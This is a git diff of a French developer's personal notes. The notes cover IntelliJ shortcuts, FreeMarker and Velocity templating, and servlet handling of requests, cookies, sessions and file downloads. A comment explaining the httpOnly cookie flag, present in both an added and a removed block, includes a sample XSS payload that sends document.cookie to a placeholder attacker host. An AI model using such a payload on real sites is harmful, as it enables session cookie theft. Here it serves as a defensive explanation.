@@ -1,4 +1,4 @@
-(?=.*wild)(?=.*fly)
+(?=.*lire)(?=.*fichier)
 Hashmap/HashTable 
 lock reentrant
 immutable interet car pas de pb de concurrence
@@ -1081,7 +1081,7 @@ les elements d'une classe ou outline: Ctrl+F12
 deplacer: se mettre sur la ligne à deplacer, ctrl+shift+fleches haut/bas
 changer les occurences plusieurs de nom: shift+F6
 changer les occurences de type de variable ctrl+shift+F6 mais à la fin ne pas faire entree je crois sinon il bidouille. Faire escape
-bouger une variable en variable declaree plus haut move deplacer selectionner variable puis Ctrl+alt+v(variable)ou ou m(methode) c(constante) ou f(champ field) LE FAIRE 2 FOIS pour plus d'otions:-) SI marche pas: passer la methode en statique > selectionner>click droit Refactore >Move. la remettre en non static et corriger les erreurs. Sert aussi à creer une classe depuis une embeded class embedded inner class
+bouger extraire extract une variable en variable declaree plus haut move deplacer selectionner variable puis Ctrl+alt+v(variable)ou ou m(methode) c(constante) ou f(champ field) LE FAIRE 2 FOIS pour plus d'otions:-) SI marche pas: passer la methode en statique > selectionner>click droit Refactore >Move. la remettre en non static et corriger les erreurs. Sert aussi à creer une classe depuis une embeded class embedded inner class
 bouger une classe dans un autre package: dans package explorer faire ctrl+x puis ctrl+v(couper-coller)
 bouger un bloc: selectionner puis ctrl+shift+fleches
 supprimer ligne: Shift+suppr ou Ctrl+y
@@ -1136,6 +1136,7 @@ pour modifier un type de fichier source: en faire un source, un repertoire de te
 erreur error details probleme explication Ctrl+F1
 search trouver rechercher partout Ctrl+shift+f // si ne marche plus bien, supprimer arreter intellij, supprimer .idea et redemarrer
 recherche trouver search partout: maj maj
+afficher toutes les erreurs problemes: pour les voir il faut faire un build
 parcourir atteindre erreurs problems F2/Maj+F2
 trouver les recurences, qui utilise reference les appelants dependance: Alt+F7 peut aussi servir à epingler un pannel
 pin epingler un tab un pannel pin j'ai rajouté le raccourci alt+$                                                                                                       
@@ -1149,7 +1150,7 @@ afficher voir parcourir liste les elements fonctions methodes d'une classe: Ctrl
 mettre un breakpoint placer un point d'arret ctrl+F8
 enable disable breakpoint: CTRL + SHIFT + F8 puis alt+d
 afficher tous les breakpoints: Ctrl+Shift+F8
-parcourir les erreurs: F2 / shift+F2
+parcourir les erreurs problems: F2 / shift+F2
 trouver rechercher un fichier par son nom name Ctrl + n(classe) ctrl + shift + n: fichier
 pour faire une trouver recherche dans les projets: focusser sur le projet et commencer à saisir les caractères
 renommer refractor rename Maj+F6: a la fin faire echape!!!
@@ -2141,8 +2142,6 @@ SeContainerInitializer initializer = SeContainerInitializer.newInstance();
 try (SeContainer container = initializer.disableDiscovery().addPackages(App.class).addBeanClasses(MyService.class).initialize()) { pas besoin de beans.xml
     container.select(MyService.class);       |_on l'empeche de scanner auto
     } 
-        
-
 
 try (SeContainer container = initializer.disableDiscovery().initialize()) { container.select(MyService.class);}
             implique beans.xml
@@ -2152,7 +2151,11 @@ try (SeContainer container = initializer.disableDiscovery().initialize()) { cont
                                                                        xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/beans_1_1.xsd"
                                                                        version="1.1"bean-discovery-mode="all">
                                                                 </beans>
-
+securite:
+       AFAIRE
+       https://javaee.github.io/tutorial/security-api004.html
+       ...
+backend:
 du code java pour aller afficher une page html sans rien faire de special
   res.setContentType("text/html");
   res.setHeader("pragma", "no-cache");
@@ -2161,9 +2164,274 @@ du code java pour aller afficher une page html sans rien faire de special
   context.setOutputStream(out);
   getPage("html.docIntrouvable").print(context);
   out.close();
+Pour afficher du html en sortie de servlet ou du texte en sortie de servlet ou n'importe quoi d'autre
+freemaker :
+      <html>
+          <head>
+            <title>Welcome!</title>
+          </head>
+          <body> <#-- commentaire -->
+            <h1>Welcome ${user}!</h1>
+            <p>Our latest product: <#if user == "Big Joe">, our beloved leader</#if> // condition (avec # au lieu de $)
+            <a href="${latestProduct.url}">${latestProduct.name}</a>!
+            <#list misc.fruits>          // faire une liste iteration iterate
+                <ul>
+                  <#items as fruit> // comme ca si ya pas de fruit alors <li> ne s'affiche pas
+                    <li>${fruit?upper_case ou ?cap_first ou ... facultatif}
+                  </#items>
+                </ul>
+              </#list>
+              <#include "/copyright_footer.html"> // inclue un autre fichier
+          </body>
+          </html>
+          // la configuration doit etre un singleton unique pour toute l'application
+                                    // Create your Configuration instance, and specify if up to what FreeMarker
+                                    // version (here 2.3.27) do you want to apply the fixes that are not 100%
+                                    // backward-compatible. See the Confi// Create your Configuration instance, and specify if up to what FreeMarker
+                                    // version (here 2.3.27) do you want to apply the fixes that are not 100%
+                                    // backward-compatible. See the Configuration JavaDoc for details.
+                                    Configuration cfg = new Configuration(Configuration.VERSION_2_3_27);
+                                    
+                                    // Specify the source where the template files come from. Here I set a
+                                    // plain directory for it, but non-file-system sources are possible too:
+                                    cfg.setDirectoryForTemplateLoading(new File("/where/you/store/templates"));
+                                    
+                                    // Set the preferred charset template files are stored in. UTF-8 is
+                                    // a good choice in most applications:
+                                    cfg.setDefaultEncoding("UTF-8");
+                                    
+                                    // Sets how errors will appear.
+                                    // During web page *development* TemplateExceptionHandler.HTML_DEBUG_HANDLER is better.
+                                    cfg.setTemplateExceptionHandler(TemplateExceptionHandler.RETHROW_HANDLER);
+                                    
+                                    // Don't log exceptions inside FreeMarker that it will thrown at you anyway:
+                                    cfg.setLogTemplateExceptions(false);
+                                    
+                                    // Wrap unchecked exceptions thrown during template processing into TemplateException-s.
+                                    cfg.setWrapUncheckedExceptions(true);
+          
+          
+          
+  Avec Velocity : (voir freemaker c'est mieux.)
+    dans un fichier toto.vm
+    #set( $contextPath = $request.getContextPath() )
+  <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
+        <link rel="stylesheet" href="${contextPath}/bower_components/bootstrap/dist/css/bootstrap.min.css">
+        <link rel="stylesheet" href="${contextPath}/bower_components/font-awesome/css/font-awesome.min.css"/>
+        <link rel="stylesheet" href="${contextPath}/stylesheets/login.css">
+    <body onload="document.forms[0].submit()">
+        <noscript>
+            <p>
+                <strong>Note:</strong> Since your browser does not support JavaScript,
+                you must press the Continue button once to proceed.
+            </p>
+        </noscript>
+        <form action="${action}" method="post">
+            <div>
+                #if($RelayState)<input type="hidden" name="RelayState" value="${RelayState}"/>#end
+                #if($SAMLRequest)<input type="hidden" name="SAMLRequest" value="${SAMLRequest}"/>#end
+                #if($SAMLResponse)<input type="hidden" name="SAMLResponse" value="${SAMLResponse}"/>#end
+            </div>
+            <noscript>
+                <div>
+                    <input type="submit" value="Continue"/>
+                </div>
+            </noscript>
+        (...)
+      Dans le java utilisation de velocity:
+          Utiliser un velocityEngine pour toute l'appli c mieux.: a l'initialisation faire:
+                  velocityEngine = new VelocityEngine();
+                  velocityEngine.setProperty(RuntimeConstants.ENCODING_DEFAULT, "UTF-8");
+                  velocityEngine.setProperty(RuntimeConstants.OUTPUT_ENCODING, "UTF-8");
+                  velocityEngine.setProperty(RuntimeConstants.RESOURCE_LOADER, "classpath");
+                  velocityEngine.setProperty("classpath.resource.loader.class", "org.apache.velocity.runtime.resource.loader.ClasspathResourceLoader");
+                  velocityEngine.setProperty(RuntimeConstants.RUNTIME_LOG_LOGSYSTEM_CLASS, Log4JLogChute.class.getName());
+                    try {
+                        velocityEngine.init();
+                    } catch (Exception e) {
+                        logger.info("Erreur d'initialisation de velocity: " + e.getMessage());
+                        logger.info(e.getLocalizedMessage());
+                    }
+          Puis pour utiliser:  
+                  VelocityContext context = new VelocityContext();
+                    context.put("request", request);
+                    context.put("response", response);
+                    context.put("action", endpointURL);
+                    context.put("SAMLRequest", encodedMessage);
+                    context.put("SAMLResponse", encodedMessage);
+                    context.put("RelayState", relayState);
+                    response.setContentType("text/html; charset=UTF-8");
+                    response.setStatus(HttpServletResponse.SC_OK);
+                    Template loginTemplate = velocityEngine.getTemplate("/path/vers/fichier/xxx.vm","ISO-8859-15");
+                    loginTemplate.merge(context, response.getWriter());
+                    ou
+                    StringWriter buffer = new StringWriter();
+                        this.velocityEngine.mergeTemplate("sso/loginpageexception.vm", "UTF-8", context, buffer);
+                        buffer.flush();
+                        return buffer.getBuffer().toString();
+                ou bien 
+                        HTTPOutTransport outTransport = (HTTPOutTransport)messageContext.getOutboundMessageTransport();
+                        HTTPTransportUtils.addNoCacheHeaders(outTransport);
+                        HTTPTransportUtils.setUTF8Encoding(outTransport);
+                        HTTPTransportUtils.setContentType(outTransport, "text/html");
+                        OutputStreamWriter out = new OutputStreamWriter(outTransport.getOutgoingStream(), "UTF-8");
+                        this.velocityEngine.mergeTemplate("/path/vers/fichier/xxx.vm", "UTF-8", e, out);
+                        out.flush();
+                        ou
+                        
+        
+            Avant: 
+            import java.io.*;
+            import javax.servlet.*;
+            import javax.servlet.http.*;
+                                            
+            public class HelloWWW extends HttpServlet {
+              public void doGet(HttpServletRequest request,
+                                HttpServletResponse response)
+                  throws ServletException, IOException {
+                  si je voulais renvoyer vers une jsp ou une page je ferais:request.getRequestDispatcher("(/WEB-INF?)/views/login.jsp").include(request, resp); ou si c'est vers un controlleur: voir plus haut LINKçç("'"'
+                        ATTENTION! doit être la dernière chose executee: pas de chain après ou d'autre redirection de request requette! java.lang.IllegalStateException: Impossible d'utiliser faire-suivre (forward) après que la reponse ait ete envoyee
+                response.setContentType("text/html"); (ou application/txt etc etc...)
+                PrintWriter out = response.getWriter();
+                out.println("<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0 " +
+                                                    "Transitional//EN\">\n" +
+                            "<HTML>\n" +
+                            "<HEAD><TITLE>Hello WWW</TITLE></HEAD>\n" +
+                            "<BODY>\n" +
+                            "<H1>Hello WWW</H1>\n" +
+                            "</BODY></HTML>");
+              }
+            }
+
+Pour afficher les elements d'un request: lister parametres
+	out.println(request.getParameter("param1") + "\n");
+ou
+   Enumeration paramNames = request.getParameterNames();
+   while(paramNames.hasMoreElements()) {
+   String paramName = (String)paramNames.nextElement();
+   System.out.println("<TR><TD>" + paramName + "\n<TD>");
+ou 
+  String[] paramValues = request.getParameterValues(paramName);
+      etc etc...
+ou si c'est dans le payload de la request
+	       BufferedReader reader= req.getReader(); // si le payload est dans la request LINK564894 sinon si c'est des paramètres de request Utiliser plutot LINKee"(çà)" 
+         StringBuilder result = new StringBuilder();
+         String line;
+         while ((line = reader.readLine()) != null) {
+        	 System.out.println("pffff"+line); 
+             result.append(line);
+         }
+         System.out.println("mon json: "+result.toString()); // result c'est le json. 
+    ou voir LINKee"(çà)" si c'est multipart		 
+(Il y a aussi: recuperer l'url du request 
+request.getMethod() 
+request.getRequestURI() // pour connaitre la page appelante. Exemple: /saml-landing
+request.getRequestURL() // renvoit tout l'URL: http://monespacerh-dev.idkidscommunity.com/saml-landing. attention si existe reverse proxy ca renvoit le bon port et le bon host.(je crois) pas l'url origine initiale du client SINON:parametrer apache avec http://httpd.apache.org/docs/2.2/mod/mod_proxy.html#proxypreservehost
+request.getQueryString() // retourne l'url mais uniquement après "?"
+request.getScheme() // renvoit http ou https... attention si existe reverse proxy ca renvoit pas celui du reverseproxy mais celui du serveurMOI.(je crois)
+request.getServerName() // renvoit le domaine: monespacerh-dev.idkidscommunity.com
+ou bien   request.getHeader("referer") ;// si c'est un src= et qu'on souhaite vraiment connaitre la page appelante. Mais peut etre que c Referer(R maj)
+request.getProtocol() ... bof...)
+
+
+pour recuperer de manière sympa les parametres renvoyes par une page web:
+				protected String getStringParameter(String name){
+							return (String)getParameter(name, String.class);	
+						}
+						
+						protected Integer getIntegerParameter(String name){
+							return (Integer) getParameter(name, Integer.class);
+						}
+				appellent:
+				protected Object getParameter(String name, Class typeRetour){
+							try {
+								String value = request.getParameter(name);
+								Constructor constructeur = typeRetour.getConstructor(new Class[]{String.class});
+								return constructeur.newInstance(new Object[]{value});
+							} catch (Exception e) {
+								return null;
+							}
+						}
+
+  recuperer un cookie a partir du request: affichier la liste des cookies : (isSecure(): le navigateur n'envoi le cookie dans reseau que si canal est securisé https (seuil "securisé" paramétrable sur le navigateur). (donc si http + secure impossible d'ouvrir session). httpOnly: empecher javascript d'acceder aux cookies LINKcooklskjhh (pirate peut injecter dans champ <img onload="document.location="http://site.pirate?c=document.cookie"); Host-only 
+                      Cookie[] cookies = request.getCookies();
+                        String cookieName = SAPCookie;
+                        String defaultValue = 1;
+                        for ( int i=0; i<cookies.length; i++) {
+                              Cookie cookie = cookies[i];
+                              System.out.println(cookie.getPath());
+                              if (cookieName.equals(cookie.getName()))
+                                return(cookie.getValue());
+                            }
+                            return(defaultValue);
+                          }
+      methode plus rapide avec spring: WebUtils.getCookie(request, "nomdemoncookie");
+  pour definir ajouter add un cookie:
+      response.addCookie(new Cookie("com.hraccess.portal.last_language", "fr_FR"));
+  renvoyer les codes d'erreur ou de succes à la reponse:(200, 500 etc...) 
+      httpServletResponse.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
+Super methode: recupere la session si il y en a une. Sinon, il en cree une nouvelle      
+    à toute request requete meme sans moimeme creer de session, le serveur defini un jsessionid dans le cookie par defaut: je le recup sur le serveur comme ça:
+        HttpSession session = servletRequest.getSession();
+    		String jsessionid = session.getId();
+        HttpSession session = request.getSession(true); //// attention recree une  nouvelle session si elle n'existe plus (mettre false si on ne veut pas ca) 
+        et ensuite on peut recuperer des variables liees à  cette session:
+          ShoppingCart previousItems =(ShoppingCart)session.getAttribute("previousItems"); (ou getValue... mais deprecie)
+         On peut tout recuperer avec l'objet session: le temps passe sur le site, le nombre de fois, la date d'acces au site....
+         request.isRequestedSessionIdValid() // est equivalent à request.getSession(false); je crois. mais si je veux savoir si l'utilisateur a ete authentifie je devrais ajouter une variable dans la session. Ou bien utiliser le request.getUserPrincipal()? 
+************************ 
+  recuperer les valeurs d'un select du request
+            request.getParameterValues("nomDeMonSelect"); // recupere les parametres get ou post. Ne pas confondre avec request.getAttribute() .setAttribute() c'est uniquement cote serveur: utilisable entre jsp et servlet aussi. Ne vient pas d'une requette request http. Peut etre un objet
+   		
+    		
+  redirige redirection web en java: (voir aussi LINKRedirectwebservice)
+    HttpServletResponse servletResponse = (HttpServletResponse)response;
+    servletResponse.sendRedirect("http://www.google.com"); Fait une redirection 302( pour faire une 301 faire response.setStatus(HttpServletResponse.SC_MOVED_PERMANENTLY);response.setHeader("Location", "http://somewhere/"); //pour un webservice voir //LINKredirwebservice998 
+    servletResponse.sendRedirect("/login");ou response.sendRedirect(request.getContextPath()+"/show.html"); // la requette request est renvoyee vers le client(url change sur browser navigateur) et redirige vers nouvelle url avec perte des params de la requette. !=.getRequestDispatcher("/urlduncontrolleur").forward(req, resp) ça reste côte serveur: ça ne va pas vers navigateur client: les params de requette sont conserves. voir LINKçç("'"'
+          ATTENTION! doit être la dernière chose executee: pas de chain après ou d'autre redirection de requette! sinon j'aurais java.lang.IllegalStateException: Impossible d'utiliser faire-suivre (forward) après que la reponse ait ete envoyee          
+  pour voir l'adresse ip du client adresse ip du reverse proxy:
+      String ipadress = request.getHeader("X-FORWARDED-FOR"); // renvoit l'adresse ip de l'utilisateur client original
+      if (ipadress==null)
+      {
+        servletRequest.getRemoteAddr(); // ip du reverse proxy si il y en a 
+      }
+    ou recuperer adresse ip de l'appelant d'une servlet
+        servletRequest.getRemoteAddr()
+
+pour recuperer le nom de l'utilisateur connecte: 
+    request.getUserPrincipal()
          
-backend :
-    fichier :
+ fichier :
+
+
+pour renvoyer un fichier de la servlet (download): astuce, on peut aussi le zipper en java et envoyer le zip comme ca il n'y a pas de pb d'encodage
+	 String header = "attachement;filename="+fileName.substring(0,fileName.lastIndexOf("."));
+				response.addHeader("content-disposition", header);
+				response.setContentType("text");
+		ServletOutputStream outstr = response.getOutputStream();
+		FileInputStream lire = new FileInputStream(file);
+		//BufferedReader reader = new BufferedReader(new InputStreamReader(lire)); // en fait si ca marche pour les fichiers UTF-8 à lire (utiliser mark et reset si besoin faire l'equivalent de pos de RandomAccessFile mais bon courage:-))
+		NON!!! il faut utiliser les BufferedInputStream et output stream parce que buffered reader encode! comme ca:
+		BufferedInputStream bis = new BufferedInputStream(lire);
+		NON: /*String ligne = "";
+		while ((ligne=reader.readLine())!=null){
+			ligne=ligne+System.getProperty("line.separator"); // LINKù*ù peut correspondre à ce quon envoit à java.exe via: -Dma.variable=/var/wtotototo...  a partir de java 5.1 on peut mettre "%n" (mettre les -D AVANT le -jar)
+			outstr.write(ligne.getBytes("ISO-8859-1")); ou outstr.write(ligne.getBytes());
+		}*/ voir ci dessous:
+autre facon PROPRE(pas de pb encodage) de faire un download a partir de l'objet struts formFile
+			public void upload(FormFile file, String location) throws Exception {
+				InputStream inputStream = file.getInputStream();
+				byte[] fileContents = new byte[file.getFileSize()];
+				inputStream.read(fileContents);
+				FileOutputStream outputFile = new FileOutputStream(new File(location + file.getFileName())); // on peut ecrire à la suite dans le fichier en rajouter un argument "append" à true
+				OutputStream fos = new BufferedOutputStream(outputFile);
+				saj.filemanager.enterprise.FileManagerService service = (saj.filemanager.enterprise.FileManagerService) SajEnterpriseLayer
+					.getDefaultInstance().getService(
+						saj.filemanager.enterprise.FileManagerService.class);
+						fos.write(fileContent);
+						fos.close();	    
+			
+ 
 Pour recuperer telecharger downloader un fichier java à partir d'une url faire une requete http lien et stocker ce fichier localement:
 	 public static void urlFileToLocalFile(String urlFullpath, String localFullPath)
 	    {
@@ -2407,7 +2675,7 @@ httpURLConnection.addRequestProperty((String) header.getKey(), (String) header.g
 
                                 Methode 2: faire une requete post post request avec apache.http qui est c plus vieux et moins bien que HttpURLConnection.:  LINKrequ939302
                                                  voir les exemples:https://hc.apache.org/httpcomponents-client-ga/examples.html
-                                                HttpClient httpClient = new HttpClient();
+                                                HttpClient httpClient = new HttpClient(); // attention peut etre qu'il ne gère pas les prop système proxy que je parametre
                                               		PostMethod postMethod = new PostMethod(this.location_UneURL);
                                               		postMethod.addHeader(new org.apache.http.message.BasicHeader("Content-Type", "application/x-www-form-urlencoded; charset=" + "UTF-8".toLowerCase())); // ajouter des headers
                                               		post.addHeader(new org.apache.http.message.BasicHeader("Content-MD5", contentMD5));
@@ -3087,195 +3355,6 @@ web.xml : webxml :
             							} catch (NamingException e)
             ejb-ref Definit une reference distante à un Entreprise JavaBean (EJB).  
             ejb-local-ref Definit une reference locale à un EJB.  
-
-
-pour recuperer de manière sympa les parametres renvoyes par une page web:
-				protected String getStringParameter(String name){
-							return (String)getParameter(name, String.class);	
-						}
-						
-						protected Integer getIntegerParameter(String name){
-							return (Integer) getParameter(name, Integer.class);
-						}
-				appellent:
-				protected Object getParameter(String name, Class typeRetour){
-							try {
-								String value = request.getParameter(name);
-								Constructor constructeur = typeRetour.getConstructor(new Class[]{String.class});
-								return constructeur.newInstance(new Object[]{value});
-							} catch (Exception e) {
-								return null;
-							}
-						}
-Pour afficher du html en sortie de servlet ou du texte en sortie de servlet ou n'importe quoi d'autre
-freemaker :
-      <html>
-          <head>
-            <title>Welcome!</title>
-          </head>
-          <body> <#-- commentaire -->
-            <h1>Welcome ${user}!</h1>
-            <p>Our latest product: <#if user == "Big Joe">, our beloved leader</#if> // condition (avec # au lieu de $)
-            <a href="${latestProduct.url}">${latestProduct.name}</a>!
-            <#list misc.fruits>          // faire une liste iteration iterate
-                <ul>
-                  <#items as fruit> // comme ca si ya pas de fruit alors <li> ne s'affiche pas
-                    <li>${fruit?upper_case ou ?cap_first ou ... facultatif}
-                  </#items>
-                </ul>
-              </#list>
-              <#include "/copyright_footer.html"> // inclue un autre fichier
-          </body>
-          </html>
-          // la configuration doit etre un singleton unique pour toute l'application
-                                    // Create your Configuration instance, and specify if up to what FreeMarker
-                                    // version (here 2.3.27) do you want to apply the fixes that are not 100%
-                                    // backward-compatible. See the Confi// Create your Configuration instance, and specify if up to what FreeMarker
-                                    // version (here 2.3.27) do you want to apply the fixes that are not 100%
-                                    // backward-compatible. See the Configuration JavaDoc for details.
-                                    Configuration cfg = new Configuration(Configuration.VERSION_2_3_27);
-                                    
-                                    // Specify the source where the template files come from. Here I set a
-                                    // plain directory for it, but non-file-system sources are possible too:
-                                    cfg.setDirectoryForTemplateLoading(new File("/where/you/store/templates"));
-                                    
-                                    // Set the preferred charset template files are stored in. UTF-8 is
-                                    // a good choice in most applications:
-                                    cfg.setDefaultEncoding("UTF-8");
-                                    
-                                    // Sets how errors will appear.
-                                    // During web page *development* TemplateExceptionHandler.HTML_DEBUG_HANDLER is better.
-                                    cfg.setTemplateExceptionHandler(TemplateExceptionHandler.RETHROW_HANDLER);
-                                    
-                                    // Don't log exceptions inside FreeMarker that it will thrown at you anyway:
-                                    cfg.setLogTemplateExceptions(false);
-                                    
-                                    // Wrap unchecked exceptions thrown during template processing into TemplateException-s.
-                                    cfg.setWrapUncheckedExceptions(true);
-          
-          
-          
-  Avec Velocity : (voir freemaker c'est mieux.)
-    dans un fichier toto.vm
-    #set( $contextPath = $request.getContextPath() )
-  <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
-        <link rel="stylesheet" href="${contextPath}/bower_components/bootstrap/dist/css/bootstrap.min.css">
-        <link rel="stylesheet" href="${contextPath}/bower_components/font-awesome/css/font-awesome.min.css"/>
-        <link rel="stylesheet" href="${contextPath}/stylesheets/login.css">
-    <body onload="document.forms[0].submit()">
-        <noscript>
-            <p>
-                <strong>Note:</strong> Since your browser does not support JavaScript,
-                you must press the Continue button once to proceed.
-            </p>
-        </noscript>
-        <form action="${action}" method="post">
-            <div>
-                #if($RelayState)<input type="hidden" name="RelayState" value="${RelayState}"/>#end
-                #if($SAMLRequest)<input type="hidden" name="SAMLRequest" value="${SAMLRequest}"/>#end
-                #if($SAMLResponse)<input type="hidden" name="SAMLResponse" value="${SAMLResponse}"/>#end
-            </div>
-            <noscript>
-                <div>
-                    <input type="submit" value="Continue"/>
-                </div>
-            </noscript>
-        (...)
-      Dans le java utilisation de velocity:
-          Utiliser un velocityEngine pour toute l'appli c mieux.: a l'initialisation faire:
-                  velocityEngine = new VelocityEngine();
-                  velocityEngine.setProperty(RuntimeConstants.ENCODING_DEFAULT, "UTF-8");
-                  velocityEngine.setProperty(RuntimeConstants.OUTPUT_ENCODING, "UTF-8");
-                  velocityEngine.setProperty(RuntimeConstants.RESOURCE_LOADER, "classpath");
-                  velocityEngine.setProperty("classpath.resource.loader.class", "org.apache.velocity.runtime.resource.loader.ClasspathResourceLoader");
-                  velocityEngine.setProperty(RuntimeConstants.RUNTIME_LOG_LOGSYSTEM_CLASS, Log4JLogChute.class.getName());
-                    try {
-                        velocityEngine.init();
-                    } catch (Exception e) {
-                        logger.info("Erreur d'initialisation de velocity: " + e.getMessage());
-                        logger.info(e.getLocalizedMessage());
-                    }
-          Puis pour utiliser:  
-                  VelocityContext context = new VelocityContext();
-                    context.put("request", request);
-                    context.put("response", response);
-                    context.put("action", endpointURL);
-                    context.put("SAMLRequest", encodedMessage);
-                    context.put("SAMLResponse", encodedMessage);
-                    context.put("RelayState", relayState);
-                    response.setContentType("text/html; charset=UTF-8");
-                    response.setStatus(HttpServletResponse.SC_OK);
-                    Template loginTemplate = velocityEngine.getTemplate("/path/vers/fichier/xxx.vm","ISO-8859-15");
-                    loginTemplate.merge(context, response.getWriter());
-                    ou
-                    StringWriter buffer = new StringWriter();
-                        this.velocityEngine.mergeTemplate("sso/loginpageexception.vm", "UTF-8", context, buffer);
-                        buffer.flush();
-                        return buffer.getBuffer().toString();
-                ou bien 
-                        HTTPOutTransport outTransport = (HTTPOutTransport)messageContext.getOutboundMessageTransport();
-                        HTTPTransportUtils.addNoCacheHeaders(outTransport);
-                        HTTPTransportUtils.setUTF8Encoding(outTransport);
-                        HTTPTransportUtils.setContentType(outTransport, "text/html");
-                        OutputStreamWriter out = new OutputStreamWriter(outTransport.getOutgoingStream(), "UTF-8");
-                        this.velocityEngine.mergeTemplate("/path/vers/fichier/xxx.vm", "UTF-8", e, out);
-                        out.flush();
-                        ou
-                        
-        
-            Avant: 
-            import java.io.*;
-            import javax.servlet.*;
-            import javax.servlet.http.*;
-                                            
-            public class HelloWWW extends HttpServlet {
-              public void doGet(HttpServletRequest request,
-                                HttpServletResponse response)
-                  throws ServletException, IOException {
-                  si je voulais renvoyer vers une jsp ou une page je ferais:request.getRequestDispatcher("(/WEB-INF?)/views/login.jsp").include(request, resp); ou si c'est vers un controlleur: voir plus haut LINKçç("'"'
-                        ATTENTION! doit être la dernière chose executee: pas de chain après ou d'autre redirection de request requette! java.lang.IllegalStateException: Impossible d'utiliser faire-suivre (forward) après que la reponse ait ete envoyee
-                response.setContentType("text/html"); (ou application/txt etc etc...)
-                PrintWriter out = response.getWriter();
-                out.println("<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0 " +
-                                                    "Transitional//EN\">\n" +
-                            "<HTML>\n" +
-                            "<HEAD><TITLE>Hello WWW</TITLE></HEAD>\n" +
-                            "<BODY>\n" +
-                            "<H1>Hello WWW</H1>\n" +
-                            "</BODY></HTML>");
-              }
-            }
-
-Pour afficher les elements d'un request: lister parametres
-	out.println(request.getParameter("param1") + "\n");
-ou
-   Enumeration paramNames = request.getParameterNames();
-   while(paramNames.hasMoreElements()) {
-   String paramName = (String)paramNames.nextElement();
-   System.out.println("<TR><TD>" + paramName + "\n<TD>");
-ou 
-  String[] paramValues = request.getParameterValues(paramName);
-      etc etc...
-ou si c'est dans le payload de la request
-	       BufferedReader reader= req.getReader(); // si le payload est dans la request LINK564894 sinon si c'est des paramètres de request Utiliser plutot LINKee"(çà)" 
-         StringBuilder result = new StringBuilder();
-         String line;
-         while ((line = reader.readLine()) != null) {
-        	 System.out.println("pffff"+line); 
-             result.append(line);
-         }
-         System.out.println("mon json: "+result.toString()); // result c'est le json. 
-    ou voir LINKee"(çà)" si c'est multipart		 
-(Il y a aussi: recuperer l'url du request 
-request.getMethod() 
-request.getRequestURI() // pour connaitre la page appelante. Exemple: /saml-landing
-request.getRequestURL() // renvoit tout l'URL: http://monespacerh-dev.idkidscommunity.com/saml-landing. attention si existe reverse proxy ca renvoit le bon port et le bon host.(je crois) pas l'url origine initiale du client SINON:parametrer apache avec http://httpd.apache.org/docs/2.2/mod/mod_proxy.html#proxypreservehost
-request.getQueryString() // retourne l'url mais uniquement après "?"
-request.getScheme() // renvoit http ou https... attention si existe reverse proxy ca renvoit pas celui du reverseproxy mais celui du serveurMOI.(je crois)
-request.getServerName() // renvoit le domaine: monespacerh-dev.idkidscommunity.com
-ou bien   request.getHeader("referer") ;// si c'est un src= et qu'on souhaite vraiment connaitre la page appelante. Mais peut etre que c Referer(R maj)
-request.getProtocol() ... bof...)
-************************
 Si j'ai un problème d'accents encodage dans le REQUEST:(voir plutot la solution RESPONSE ci dessous) du formulaire jsp vers les actions:
 		J'avais un dynaform ou dynavalidatorform qui prenait des parametres string et on y rentrait dans le formulaire des accents. En cas de non validation retour à l'input avec les accents complettement chelous.
 		il faut utiliser le filtre org.apache.webapp.admin.filters.SetCharacterEncodingFilter qui se trouve dans la librairie catalina-admin-5.0.28.jar
@@ -3331,20 +3410,8 @@ Si j'ai un problème d'accents dans le RESPONSE: des actions vers les jsp (affic
 									(voir SessionTraceFilter qui est un bon exemple de filtre)
 								}
 							}
-pour renvoyer un fichier de la servlet (download): astuce, on peut aussi le zipper en java et envoyer le zip comme ca il n'y a pas de pb d'encodage
-	 String header = "attachement;filename="+fileName.substring(0,fileName.lastIndexOf("."));
-				response.addHeader("content-disposition", header);
-				response.setContentType("text");
-		ServletOutputStream outstr = response.getOutputStream();
-		FileInputStream lire = new FileInputStream(file);
-		//BufferedReader reader = new BufferedReader(new InputStreamReader(lire)); // en fait si ca marche pour les fichiers UTF-8 à lire (utiliser mark et reset si besoin faire l'equivalent de pos de RandomAccessFile mais bon courage:-))
-		NON!!! il faut utiliser les BufferedInputStream et output stream parce que buffered reader encode! comme ca:
-		BufferedInputStream bis = new BufferedInputStream(lire);
-		NON: /*String ligne = "";
-		while ((ligne=reader.readLine())!=null){
-			ligne=ligne+System.getProperty("line.separator"); // LINKù*ù peut correspondre à ce quon envoit à java.exe via: -Dma.variable=/var/wtotototo...  a partir de java 5.1 on peut mettre "%n" (mettre les -D AVANT le -jar)
-			outstr.write(ligne.getBytes("ISO-8859-1")); ou outstr.write(ligne.getBytes());
-		}*/ voir ci dessous:
+
+
 Pour convertir un input stream en output stream voir afficher
 		OUI: 
 		byte[] buffer = new byte[1024]; (=1Giga)
@@ -3353,65 +3420,7 @@ Pour convertir un input stream en output stream voir afficher
 		outstr.write(buffer,0,line);
 	    }
 
-autre facon PROPRE(pas de pb encodage) de faire un download a partir de l'objet struts formFile
-			public void upload(FormFile file, String location) throws Exception {
-				InputStream inputStream = file.getInputStream();
-				byte[] fileContents = new byte[file.getFileSize()];
-				inputStream.read(fileContents);
-				FileOutputStream outputFile = new FileOutputStream(new File(location + file.getFileName())); // on peut ecrire à la suite dans le fichier en rajouter un argument "append" à true
-				OutputStream fos = new BufferedOutputStream(outputFile);
-				saj.filemanager.enterprise.FileManagerService service = (saj.filemanager.enterprise.FileManagerService) SajEnterpriseLayer
-					.getDefaultInstance().getService(
-						saj.filemanager.enterprise.FileManagerService.class);
-						fos.write(fileContent);
-						fos.close();	    
-			
 
-  recuperer un cookie a partir du request: affichier la liste des cookies : (isSecure(): le navigateur n'envoi le cookie dans reseau que si canal est securisé https (seuil "securisé" paramétrable sur le navigateur). (donc si http + secure impossible d'ouvrir session). httpOnly: empecher javascript d'acceder aux cookies LINKcooklskjhh (pirate peut injecter dans champ <img onload="document.location="http://site.pirate?c=document.cookie"); Host-only 
-                      Cookie[] cookies = request.getCookies();
-                        String cookieName = SAPCookie;
-                        String defaultValue = 1;
-                        for ( int i=0; i<cookies.length; i++) {
-                              Cookie cookie = cookies[i];
